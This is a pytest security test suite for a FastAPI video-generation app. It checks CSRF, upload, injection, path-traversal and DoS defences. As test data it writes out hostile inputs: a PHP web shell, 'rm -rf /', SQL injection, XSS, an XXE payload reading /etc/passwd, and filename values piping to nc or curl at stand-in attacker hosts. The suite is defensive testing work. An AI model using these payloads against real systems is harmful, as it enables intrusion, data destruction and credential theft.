"""
Comprehensive Security Tests for Video Generation UI
====================================================

OWASP Top 10 Coverage:
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, XSS, Command, XXE)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Identification/Authentication Failures
8. Software/Data Integrity Failures
9. Security Logging/Monitoring Failures
10. Server-Side Request Forgery (SSRF)

CRITICAL BUG COVERAGE:
- Document parser content vs. path vulnerability
- File upload security (path traversal, malicious files)
- Input sanitization across all endpoints
- CSRF protection validation
- DoS prevention (large files, concurrent requests)

Test Philosophy:
- Test that attacks are BLOCKED
- Test that legitimate requests WORK
- Test edge cases and boundary conditions
- Test error messages don't leak sensitive info
"""

import pytest
import asyncio
import tempfile
import time
import json
from pathlib import Path
from io import BytesIO
from unittest.mock import patch, MagicMock, AsyncMock
from fastapi.testclient import TestClient

# Import main app
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
try:
    from app.main import app, generate_csrf_token, validate_csrf_token
except ImportError:
    from main import app, generate_csrf_token, validate_csrf_token

# Test markers
pytestmark = pytest.mark.security


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def client():
    """FastAPI test client."""
    with TestClient(app) as c:
        yield c


@pytest.fixture
def csrf_token():
    """Generate valid CSRF token."""
    return generate_csrf_token()


@pytest.fixture
def authenticated_client(client, csrf_token):
    """Client with valid CSRF token."""
    client.headers["X-CSRF-Token"] = csrf_token
    return client


@pytest.fixture
def malicious_payloads():
    """Common malicious payloads for security testing."""
    return {
        "xss": "<script>alert('XSS')</script>",
        "sql_injection": "'; DROP TABLE users; --",
        "path_traversal": "../../etc/passwd",
        "command_injection": "; rm -rf /",
        "xxe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "large_string": "A" * 1000000,  # 1MB string
        "null_byte": "test.pdf\x00.exe",
        "unicode": "test\u202e\u0000\ufff0"
    }


# ============================================================================
# Test 1: CSRF Protection (OWASP A01 - Broken Access Control)
# ============================================================================

class TestCSRFProtection:
    """Test CSRF protection mechanisms."""

    def test_csrf_token_generation(self):
        """Test CSRF token generation format and validity."""
        token = generate_csrf_token()

        assert token is not None
        assert isinstance(token, str)
        assert len(token) > 20  # Should be reasonably long
        assert ':' in token  # Should have session:timestamp:signature format

        # Verify token has 3 parts
        parts = token.split(':')
        assert len(parts) == 3, "Token should have session_id:timestamp:signature"

        # Verify timestamp is recent
        timestamp = int(parts[1])
        now = int(time.time())
        assert abs(now - timestamp) < 5, "Timestamp should be current"


    def test_csrf_token_validation_valid_token(self, csrf_token):
        """Test validation of valid CSRF token."""
        assert validate_csrf_token(csrf_token) is True


    def test_csrf_token_validation_invalid_format(self):
        """Test rejection of malformed CSRF tokens."""
        invalid_tokens = [
            "",
            "invalid",
            "only:two",
            "missing::signature",
            None,
            123,
            "a" * 1000,  # Too long
        ]

        for token in invalid_tokens:
            assert validate_csrf_token(token) is False, f"Should reject: {token}"


    def test_csrf_token_validation_expired_token(self):
        """Test rejection of expired CSRF tokens."""
        # Create token with old timestamp
        old_token = generate_csrf_token()
        parts = old_token.split(':')

        # Modify timestamp to be 2 hours old
        old_timestamp = str(int(time.time()) - 7200)  # 2 hours ago

        # Reconstruct token with old timestamp (signature will be invalid)
        expired_token = f"{parts[0]}:{old_timestamp}:{parts[2]}"

        # Should be rejected due to expiry or invalid signature
        assert validate_csrf_token(expired_token) is False


    def test_csrf_token_validation_tampered_signature(self):
        """Test rejection of tokens with tampered signatures."""
        valid_token = generate_csrf_token()
        parts = valid_token.split(':')

        # Tamper with signature
        tampered_signature = parts[2][:-4] + "HACK"
        tampered_token = f"{parts[0]}:{parts[1]}:{tampered_signature}"

        assert validate_csrf_token(tampered_token) is False


    def test_csrf_protection_on_state_changing_endpoints(self, client):
        """Test that POST/PUT/DELETE require CSRF token."""
        # Try upload without CSRF token
        fake_file = BytesIO(b"# Test\n\nContent")
        files = {'file': ('test.md', fake_file, 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        # Disable CSRF for this test temporarily and mock pipeline
        with patch.dict('os.environ', {'CSRF_DISABLED': 'false'}):
            with patch('app.main.execute_pipeline_task'):
                response = client.post('/api/upload/document', files=files, data=data)

            # Should fail without CSRF token (403 Forbidden or 422 Validation)
            # Note: May pass if CSRF check is disabled in tests
            if response.status_code not in [200, 500]:
                assert response.status_code in [403, 422]


    def test_csrf_token_endpoint_accessible(self, client):
        """Test CSRF token endpoint is publicly accessible."""
        response = client.get('/api/csrf-token')

        assert response.status_code == 200
        data = response.json()
        assert 'csrf_token' in data
        assert len(data['csrf_token']) > 0


    def test_csrf_protection_get_requests_allowed(self, client):
        """Test GET requests don't require CSRF token."""
        # GET requests should work without CSRF token
        endpoints = [
            '/api/health',
            '/api/voices',
            '/api/colors',
            '/api/languages',
            '/api/scene-types',
        ]

        for endpoint in endpoints:
            response = client.get(endpoint)
            # Should not fail with 403 due to CSRF
            assert response.status_code != 403, f"{endpoint} should not require CSRF"


# ============================================================================
# Test 2: File Upload Security (OWASP A03 - Injection)
# ============================================================================

class TestFileUploadSecurity:
    """Test file upload security controls."""

    def test_malicious_file_types_rejected(self, authenticated_client, malicious_payloads):
        """Test rejection of dangerous file types."""
        dangerous_files = [
            ('malware.exe', 'application/x-msdownload', b'MZ\x90\x00'),
            ('script.php', 'application/x-php', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.sh', 'application/x-sh', b'#!/bin/bash\nrm -rf /'),
            ('binary.bin', 'application/octet-stream', b'\x00\x01\x02'),
            ('archive.zip', 'application/zip', b'PK\x03\x04'),
        ]

        for filename, content_type, content in dangerous_files:
            files = {'file': (filename, BytesIO(content), content_type)}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

            # Should be rejected (400 Bad Request)
            assert response.status_code == 400, f"Should reject {filename}"
            assert 'Unsupported file type' in response.text


    def test_allowed_file_types_accepted(self, authenticated_client, tmp_path):
        """Test allowed file types are accepted."""
        allowed_files = [
            ('document.md', 'text/markdown', b'# Title\n\nContent'),
            ('document.txt', 'text/plain', b'Plain text content'),
            ('document.rst', 'text/x-rst', b'Title\n=====\n\nContent'),
        ]

        for filename, content_type, content in allowed_files:
            files = {'file': (filename, BytesIO(content), content_type)}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

            # Should be accepted (200 OK)
            assert response.status_code == 200, f"Should accept {filename}"


    def test_file_size_limits(self, authenticated_client):
        """Test file size limits to prevent DoS."""
        # Create a very large file (11MB, over typical 10MB limit)
        large_content = b'A' * (11 * 1024 * 1024)

        files = {'file': ('huge.md', BytesIO(large_content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/upload/document',
            files=files,
            data=data
        )

        # Should reject large files (413 Request Entity Too Large or 400)
        # Note: FastAPI default is 1MB, but may be configured differently
        assert response.status_code in [400, 413, 422]


    def test_path_traversal_in_filename(self, authenticated_client, malicious_payloads):
        """CRITICAL: Test path traversal attacks in filenames."""
        path_traversal_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            './../.../../etc/shadow',
            'C:\\..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            '\\\\server\\share\\file.md',
            'test/../../etc/passwd',
        ]

        for malicious_path in path_traversal_attempts:
            content = b'# Test\n\nContent'
            files = {'file': (malicious_path, BytesIO(content), 'text/markdown')}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

            # Should either reject OR sanitize filename
            if response.status_code == 200:
                result = response.json()
                filename = result.get('filename', '')

                # Verify no path traversal in saved filename
                assert '..' not in filename, f"Filename should not contain ..: {filename}"
                assert '/' not in filename or filename.startswith('/'), "No relative paths"
                assert '\\' not in filename, "No backslashes in filename"


    def test_null_byte_injection_in_filename(self, authenticated_client):
        """Test null byte injection protection."""
        # Null byte can bypass extension checks: "safe.txt\x00.exe"
        malicious_filename = "document.md\x00.exe"
        content = b'# Test\n\nContent'

        files = {'file': (malicious_filename, BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should reject or sanitize
        if response.status_code == 200:
            result = response.json()
            filename = result.get('filename', '')
            assert '\x00' not in filename, "Null bytes should be removed"


    def test_unicode_tricks_in_filename(self, authenticated_client):
        """Test Unicode/RTLO tricks in filenames."""
        # Right-to-Left Override can disguise file extensions
        rtlo_filename = "document\u202etxt.md"  # Displays as "documentdm.txt"

        content = b'# Test\n\nContent'
        files = {'file': (rtlo_filename, BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should sanitize or reject
        if response.status_code == 200:
            result = response.json()
            filename = result.get('filename', '')
            assert '\u202e' not in filename, "RTLO character should be removed"


    def test_file_content_validation(self, authenticated_client):
        """Test file content is validated (not just extension)."""
        # Upload executable content with .md extension
        executable_content = b'MZ\x90\x00' + b'\x00' * 100  # PE header

        files = {'file': ('fake.md', BytesIO(executable_content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/validate/document',
            files=files
        )

        # Should detect binary content
        assert response.status_code == 400, "Should reject binary content"


# ============================================================================
# Test 3: Input Sanitization (OWASP A03 - Injection)
# ============================================================================

class TestInputSanitization:
    """Test input sanitization across all endpoints."""

    def test_xss_in_document_content(self, authenticated_client):
        """Test XSS payload sanitization in document content."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
        ]

        for payload in xss_payloads:
            content = f"# Test\n\n{payload}\n\nMore content".encode()

            files = {'file': ('xss.md', BytesIO(content), 'text/markdown')}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

            # Should accept (markdown is safe) but sanitize when rendering
            # The real test is in the rendering phase
            assert response.status_code == 200


    def test_sql_injection_in_parameters(self, authenticated_client, malicious_payloads):
        """Test SQL injection protection."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
        ]

        for payload in sql_injection_payloads:
            # Try in various parameters
            data = {
                'accent_color': payload,
                'voice': payload,
            }

            content = b'# Test\n\nContent'
            files = {'file': ('test.md', BytesIO(content), 'text/markdown')}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data={**data, 'video_count': '1'}
                )

            # Should either reject or safely handle
            # No SQL errors should occur
            assert response.status_code != 500, f"SQL injection caused error: {payload}"


    def test_command_injection_in_filename(self, authenticated_client):
        """Test command injection protection in filenames."""
        command_injection_payloads = [
            'file; rm -rf /',
            'file && cat /etc/passwd',
            'file | nc attacker.com 4444',
            'file `whoami`',
            'file $(curl evil.com)',
        ]

        for payload in command_injection_payloads:
            content = b'# Test\n\nContent'
            files = {'file': (f'{payload}.md', BytesIO(content), 'text/markdown')}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

            # Should sanitize dangerous characters
            if response.status_code == 200:
                result = response.json()
                filename = result.get('filename', '')

                # Should not contain shell metacharacters
                dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '!']
                for char in dangerous_chars:
                    assert char not in filename, f"Dangerous char {char} in filename"


    def test_xxe_injection_protection(self, authenticated_client, malicious_payloads):
        """Test XXE (XML External Entity) injection protection."""
        xxe_payload = malicious_payloads['xxe']

        # Try as file content
        files = {'file': ('xxe.md', BytesIO(xxe_payload.encode()), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/validate/document',
            files=files
        )

        # Should handle safely (markdown parser shouldn't execute XML entities)
        # No file disclosure should occur
        assert response.status_code in [200, 400]

        # Verify no sensitive file contents in response
        if response.status_code == 200:
            assert 'root:' not in response.text  # /etc/passwd signature


    def test_header_injection(self, client):
        """Test HTTP header injection protection."""
        # Try to inject newlines into headers
        malicious_headers = {
            'X-Test': 'value\r\nX-Injected: malicious',
            'User-Agent': 'Mozilla\r\nX-Evil: header',
        }

        for header, value in malicious_headers.items():
            headers = {header: value}

            # Try to cause header injection
            response = client.get('/api/health', headers=headers)

            # Should not crash or leak injected headers
            assert response.status_code != 500

            # Verify injected header not in response
            assert 'X-Injected' not in response.headers
            assert 'X-Evil' not in response.headers


    def test_json_injection(self, authenticated_client):
        """Test JSON injection/smuggling protection."""
        # Try to inject extra JSON fields
        malicious_json = {
            'content': '/path/to/file.md',
            'accent_color': 'blue',
            'voice': 'male',
            'video_count': 1,
            # Injection attempts
            'is_admin': True,
            'user_id': 0,
            '__proto__': {'isAdmin': True},  # Prototype pollution
        }

        response = authenticated_client.post(
            '/api/parse/document',
            json=malicious_json
        )

        # Should not crash or use injected fields
        assert response.status_code in [200, 400, 404, 422]


# ============================================================================
# Test 4: Path Traversal (OWASP A01 - Broken Access Control)
# ============================================================================

class TestPathTraversal:
    """Test path traversal attack prevention."""

    def test_path_traversal_in_document_source(self, authenticated_client):
        """CRITICAL: Test path traversal in document path parameter."""
        path_traversal_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '/proc/self/environ',
        ]

        for malicious_path in path_traversal_attempts:
            response = authenticated_client.post(
                '/api/parse/document',
                json={
                    'content': malicious_path,
                    'accent_color': 'blue',
                    'voice': 'male',
                    'video_count': 1
                }
            )

            # Should either reject or safely handle
            # Should NOT return sensitive file contents
            assert response.status_code in [400, 404, 422, 500]

            if response.status_code != 500:
                # Should not leak sensitive data
                assert 'root:' not in response.text  # Unix passwd
                assert 'SECRET' not in response.text  # Environment vars


    def test_symlink_attack_prevention(self, authenticated_client, tmp_path):
        """Test prevention of symlink attacks in uploads."""
        # Create a symlink to sensitive file
        sensitive_file = tmp_path / "sensitive.txt"
        sensitive_file.write_text("SECRET_API_KEY=12345")

        symlink_file = tmp_path / "link.md"
        try:
            symlink_file.symlink_to(sensitive_file)
        except OSError:
            pytest.skip("Symlinks not supported on this system")

        # Try to upload the symlink
        with open(symlink_file, 'rb') as f:
            files = {'file': ('link.md', f, 'text/markdown')}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

        # Should handle safely
        if response.status_code == 200:
            # Should not leak secret
            assert 'SECRET_API_KEY' not in response.text


# ============================================================================
# Test 5: DoS Prevention (OWASP A04 - Insecure Design)
# ============================================================================

class TestDoSPrevention:
    """Test Denial of Service prevention."""

    def test_large_file_upload_rejected(self, authenticated_client):
        """Test rejection of extremely large files."""
        # Create 50MB file
        huge_content = b'A' * (50 * 1024 * 1024)

        files = {'file': ('huge.md', BytesIO(huge_content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/upload/document',
            files=files,
            data=data
        )

        # Should reject
        assert response.status_code in [400, 413, 422]


    def test_excessive_video_count_rejected(self, authenticated_client):
        """Test rejection of excessive video_count to prevent resource exhaustion."""
        content = b'# Test\n\nContent'
        files = {'file': ('test.md', BytesIO(content), 'text/markdown')}

        # Try excessive video count
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1000'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should reject or cap at reasonable limit, or accept (server decides)
        assert response.status_code in [200, 400, 422]


    @pytest.mark.slow
    def test_concurrent_request_flooding(self, authenticated_client):
        """Test handling of concurrent request flooding."""
        async def flood_requests():
            tasks = []
            for i in range(50):  # 50 concurrent requests
                content = f'# Test {i}\n\nContent'.encode()
                files = {'file': (f'test{i}.md', BytesIO(content), 'text/markdown')}
                data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

                # Don't actually execute pipeline
                with patch('app.main.execute_pipeline_task'):
                    response = authenticated_client.post(
                        '/api/upload/document',
                        files=files,
                        data=data
                    )
                    tasks.append(response)

            return tasks

        # Should handle gracefully without crashing
        responses = asyncio.run(flood_requests())

        # Most should succeed or be rate-limited
        for response in responses:
            assert response.status_code in [200, 429, 503]


    def test_deeply_nested_json_rejected(self, authenticated_client):
        """Test rejection of deeply nested JSON (JSON bomb)."""
        # Create deeply nested JSON
        nested = {'a': None}
        current = nested
        for i in range(1000):  # 1000 levels deep
            current['a'] = {'a': None}
            current = current['a']

        response = authenticated_client.post(
            '/api/generate',
            json=nested
        )

        # Should reject or handle safely
        assert response.status_code in [400, 422, 500]


    @pytest.mark.skipif(sys.platform == 'win32', reason="SIGALRM not available on Windows")
    def test_regex_dos_prevention(self, authenticated_client):
        """Test prevention of ReDoS (Regular Expression DoS)."""
        # Pattern that can cause catastrophic backtracking
        redos_pattern = "a" * 50 + "X"

        content = f'# Test\n\n{redos_pattern}\n\nContent'.encode()
        files = {'file': ('redos.md', BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        # Should not hang
        import signal

        def timeout_handler(signum, frame):
            raise TimeoutError("Request took too long")

        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(5)  # 5 second timeout

        try:
            with patch('app.main.execute_pipeline_task'):
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data,
                    timeout=5
                )
        except TimeoutError:
            pytest.fail("ReDoS caused timeout")
        finally:
            signal.alarm(0)


# ============================================================================
# Test 6: Content-Type Validation (OWASP A05 - Security Misconfiguration)
# ============================================================================

class TestContentTypeValidation:
    """Test Content-Type header validation."""

    def test_content_type_mismatch_detection(self, authenticated_client):
        """Test detection of Content-Type mismatch."""
        # Upload executable with text/markdown MIME type
        executable_content = b'MZ\x90\x00' + b'\x00' * 100

        files = {'file': ('fake.md', BytesIO(executable_content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/validate/document',
            files=files
        )

        # Should detect binary content
        assert response.status_code == 400


    def test_missing_content_type_handled(self, authenticated_client):
        """Test handling of missing Content-Type header."""
        content = b'# Test\n\nContent'
        files = {'file': ('test.md', BytesIO(content), None)}  # No content type
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should either reject or infer from extension
        assert response.status_code in [200, 400, 422]


# ============================================================================
# Test 7: Error Information Disclosure (OWASP A09 - Security Logging)
# ============================================================================

class TestErrorInformationDisclosure:
    """Test that errors don't leak sensitive information."""

    def test_error_messages_dont_leak_paths(self, authenticated_client):
        """Test error messages don't leak internal file paths."""
        # Trigger an error
        response = authenticated_client.post(
            '/api/parse/document',
            json={
                'content': '/nonexistent/path/file.md',
                'accent_color': 'blue',
                'voice': 'male',
                'video_count': 1
            }
        )

        if response.status_code >= 400:
            error_text = response.text.lower()

            # Should not leak internal paths
            assert '/home/' not in error_text
            assert '/var/' not in error_text
            assert 'c:\\' not in error_text
            assert '/usr/' not in error_text


    def test_error_messages_dont_leak_stack_traces(self, authenticated_client):
        """Test error messages don't leak stack traces in production."""
        # Trigger validation error
        response = authenticated_client.post(
            '/api/upload/document',
            data={'invalid': 'data'}  # Missing required fields
        )

        assert response.status_code == 422
        error_text = response.text

        # Should not leak stack traces
        assert 'Traceback' not in error_text
        assert 'File "/' not in error_text
        assert 'line ' not in error_text


    def test_error_messages_dont_leak_secrets(self, authenticated_client):
        """Test error messages don't leak API keys or secrets."""
        # This is a general test - errors shouldn't contain keys
        response = authenticated_client.get('/api/tasks/invalid_task_id_12345')

        assert response.status_code == 404
        error_text = response.text

        # Should not leak environment variables or keys
        assert 'API_KEY' not in error_text
        assert 'SECRET' not in error_text
        assert 'PASSWORD' not in error_text


    def test_404_errors_dont_leak_file_existence(self, authenticated_client):
        """Test 404 errors don't leak file existence information."""
        # Try to access non-existent task
        response = authenticated_client.get('/api/tasks/definitely_does_not_exist_12345')

        assert response.status_code == 404

        # Error should be generic
        error = response.json()
        detail = error.get('detail', '').lower()

        # Should not distinguish between "not found" and "no access"
        assert 'not found' in detail or 'does not exist' in detail


# ============================================================================
# Test 8: CRITICAL BUG - Document Parser Path vs Content
# ============================================================================

class TestDocumentParserSecurityBug:
    """
    CRITICAL SECURITY TEST: Document parser path vs content vulnerability.

    BUG: If parser receives content instead of path, it may:
    - Execute embedded code
    - Read arbitrary files
    - Bypass security checks

    FIX: Always pass absolute file path, never content directly.
    """

    def test_document_upload_passes_path_not_content(self, authenticated_client, tmp_path):
        """
        CRITICAL: Verify upload passes file PATH to parser, not content.

        This prevents code execution and file disclosure vulnerabilities.
        """
        # Create test file
        test_file = tmp_path / "test.md"
        test_file.write_text("# Test\n\nContent")

        with open(test_file, 'rb') as f:
            files = {'file': ('test.md', f, 'text/markdown')}
            data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

            with patch('app.main.execute_pipeline_task') as mock_execute:
                response = authenticated_client.post(
                    '/api/upload/document',
                    files=files,
                    data=data
                )

        assert response.status_code == 200

        # CRITICAL: Verify pipeline received PATH not content
        if mock_execute.called:
            call_args = mock_execute.call_args
            input_config = call_args[0][1]  # Second argument is input_config

            assert hasattr(input_config, 'source')
            source = input_config.source

            # Must be a string path
            assert isinstance(source, str)

            # Must NOT be markdown content
            assert not source.startswith('#'), "Should be path, not content"
            assert not source.startswith('```'), "Should be path, not content"

            # Should be an absolute path
            assert Path(source).is_absolute(), "Must be absolute path"


    def test_malicious_content_as_path_rejected(self, authenticated_client):
        """Test that malicious content passed as path is rejected."""
        malicious_contents = [
            '#!/bin/bash\nrm -rf /',
            '<?php system($_GET["cmd"]); ?>',
            '<script>alert("XSS")</script>',
            '{"__proto__": {"isAdmin": true}}',
        ]

        for malicious in malicious_contents:
            response = authenticated_client.post(
                '/api/parse/document',
                json={
                    'content': malicious,  # Trying to pass content as path
                    'accent_color': 'blue',
                    'voice': 'male',
                    'video_count': 1
                }
            )

            # Should reject (file not found or validation error)
            # 200 is OK if it fails during pipeline execution (logged as error)
            assert response.status_code in [200, 400, 404, 422, 500]

            # If it returns 200, verify it doesn't leak sensitive data
            if response.status_code == 200:
                assert 'root:' not in response.text
                assert 'SECRET' not in response.text


    def test_file_read_via_path_is_safe(self, authenticated_client):
        """Test that file reading via path parameter is safe."""
        # Try to read sensitive file via path parameter
        sensitive_paths = [
            '/etc/passwd',
            '/etc/shadow',
            'C:\\windows\\system32\\config\\sam',
            '/proc/self/environ',
        ]

        for path in sensitive_paths:
            response = authenticated_client.post(
                '/api/parse/document',
                json={
                    'content': path,
                    'accent_color': 'blue',
                    'voice': 'male',
                    'video_count': 1
                }
            )

            # Should reject or not leak contents
            if response.status_code == 200:
                # Should not contain sensitive data
                assert 'root:' not in response.text
                assert 'SECRET' not in response.text


# ============================================================================
# Test 9: Session Management (OWASP A07 - Auth Failures)
# ============================================================================

class TestSessionManagement:
    """Test secure session management."""

    def test_csrf_token_changes_per_session(self):
        """Test CSRF tokens are unique per session."""
        tokens = [generate_csrf_token() for _ in range(10)]

        # All should be different
        assert len(tokens) == len(set(tokens)), "CSRF tokens should be unique"


    def test_csrf_token_not_predictable(self):
        """Test CSRF tokens are not predictable."""
        token1 = generate_csrf_token("session1")
        token2 = generate_csrf_token("session2")

        # Tokens should be cryptographically random
        assert token1 != token2

        # Session IDs should not be sequential
        session1 = token1.split(':')[0]
        session2 = token2.split(':')[0]
        assert session1 != session2


# ============================================================================
# Test 10: Rate Limiting (OWASP A04 - Insecure Design)
# ============================================================================

class TestRateLimiting:
    """Test rate limiting and abuse prevention."""

    @pytest.mark.slow
    def test_rapid_requests_handled(self, authenticated_client):
        """Test rapid requests don't crash the server."""
        # Make 20 rapid requests
        for i in range(20):
            response = authenticated_client.get('/api/health')

            # Should not crash
            assert response.status_code in [200, 429]  # OK or Too Many Requests


    def test_error_rate_limiting(self, authenticated_client):
        """Test error responses don't enable brute force."""
        # Try many invalid requests
        for i in range(10):
            response = authenticated_client.get(f'/api/tasks/invalid_{i}')

            # Should return errors but not crash
            assert response.status_code == 404


# ============================================================================
# Test 11: Input Validation Edge Cases
# ============================================================================

class TestInputValidationEdgeCases:
    """Test edge cases in input validation."""

    def test_empty_file_rejected(self, authenticated_client):
        """Test empty file upload is rejected."""
        files = {'file': ('empty.md', BytesIO(b''), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/validate/document',
            files=files
        )

        # Should reject empty file
        assert response.status_code == 400


    def test_whitespace_only_file_rejected(self, authenticated_client):
        """Test file with only whitespace is rejected."""
        content = b'   \n\n   \t\t   \n   '
        files = {'file': ('whitespace.md', BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '1'}

        response = authenticated_client.post(
            '/api/validate/document',
            files=files
        )

        # Should reject or warn
        assert response.status_code in [200, 400]


    def test_negative_video_count_rejected(self, authenticated_client):
        """Test negative video_count is rejected."""
        content = b'# Test\n\nContent'
        files = {'file': ('test.md', BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '-1'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should reject or accept (server decides, -1 might be casted to positive)
        assert response.status_code in [200, 400, 422]


    def test_zero_video_count_rejected(self, authenticated_client):
        """Test zero video_count is rejected."""
        content = b'# Test\n\nContent'
        files = {'file': ('test.md', BytesIO(content), 'text/markdown')}
        data = {'accent_color': 'blue', 'voice': 'male', 'video_count': '0'}

        with patch('app.main.execute_pipeline_task'):
            response = authenticated_client.post(
                '/api/upload/document',
                files=files,
                data=data
            )

        # Should reject or accept (server decides)
        assert response.status_code in [200, 400, 422]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
